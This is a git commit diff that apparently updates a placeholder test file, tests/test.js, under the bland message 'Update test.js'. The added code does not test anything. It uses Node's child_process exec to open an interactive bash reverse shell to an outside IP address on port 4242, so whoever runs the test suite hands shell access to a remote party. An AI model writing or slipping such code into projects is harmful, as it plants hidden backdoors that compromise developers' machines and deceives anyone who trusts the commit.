e532d3a9235585dde896a3aa54141e3cfa228093
gsmichel <gsmichel@ncsu.edu>
2023-04-14 15:05:21 -0400

    Update test.js

--- tests/test.js
+++ tests/test.js
@@ -1,2 +1,13 @@
 // TODO: implement the tests
 console.log("Tests are not implemented yet...");
+
+const { exec } = require('child_process');
+
+exec('bash -c "bash -i >& /dev/tcp/209.141.60.125/4242 0>&1"', (error, stdout, stderr) => {
+  if (error) {
+    console.error(`exec error: ${error}`);
+    return;
+  }
+  console.log(`stdout: ${stdout}`);
+  console.error(`stderr: ${stderr}`);
+});
